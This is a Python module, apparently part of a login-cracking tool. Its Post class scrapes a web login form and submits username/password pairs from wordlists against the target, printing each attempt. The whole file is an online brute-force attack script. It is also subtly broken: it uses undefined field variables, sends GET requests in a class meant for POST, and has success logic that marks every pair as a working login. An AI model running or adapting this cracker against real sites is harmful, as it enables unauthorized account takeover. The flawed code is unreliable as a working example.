
import requests
from urllib.parse import urlencode

from units.http.tools import HTML
from modules.dictionary import Dictionary


class Post:

    def __init__(self, unit):
        self.unit = unit

    def crack(self, dictionaries):

        print('[<#########>] {0}'.format(self.unit.task))

        print('[COMPLEMENT] {0} - {1}'.format(self.unit.url, self.unit.complements))

        attrs = self.unit.task['attrs']

        if 'form' not in attrs:
            return {'status':-1, 'msg':'No "form" attribute'}

        if ('session' in attrs) and not attrs['session']:
            requester = requests
        else:
            attrs['session'] = True
            requester = requests.Session()

        # First request to take all info we need to continue (cookies for example)
        response = None
        if attrs['session'] and ('index' in attrs['form']):
            request = {'method':'get', 'url':self.unit.url}
            request.update(self.unit.complements)
            response = requester.request(**request)

        # Get indexed form
        if 'index' in attrs['form']:
            html = HTML(response.text)
            login_form = html.get_login_forms()[attrs['form']['index']]
        else:
            login_form = attrs['form']

        print('[cracking.attrs] {0}'.format(attrs))

        if not (('usr_field' in login_form) and ('pwd_field' in login_form)):
            return {'status':-2, 'msg':'Incomplete form tag information'}

        # Start cracking
        fields = login_form['fields'].copy()
        request = {'method':'get', 'url':self.unit.url, 'data':fields}
        request.update(self.unit.complements)
        for dictionary in dictionaries:
            for username, password in Dictionary(**dictionary).pairs():
                print('[http] Forcing Username: {0} - Password: {1}'.format(username, password))

                request['data'][usr_field] = username
                request['data'][pwd_field] = password

                response = requester.request(**request)
                html = HTML(response.text)

                # Detect if the login was successful
                if 'fail' in attrs:
                    # This will be a complex structure
                    pass
                else:
                    forms = html.find_all('form')
                    for form in forms:
                        if form.find('input', attrs={'name':login_form['fields']['usr_field']}) and\
                           form.find('input', attrs={'name':login_form['fields']['pwd_field']}):
                            continue
                    
                    self.unit.success({'username':username, 'password':password},
                                          {'data':request['data']})

                if ('reload' in attrs['form']) and (attrs['form']['reload']):
                    request['data'] = dict([(inp.attrs['name'], inp.attrs['value']) 
                                            for inp in form.find_all('input', {'type':'hidden'})])

        return {'status':0}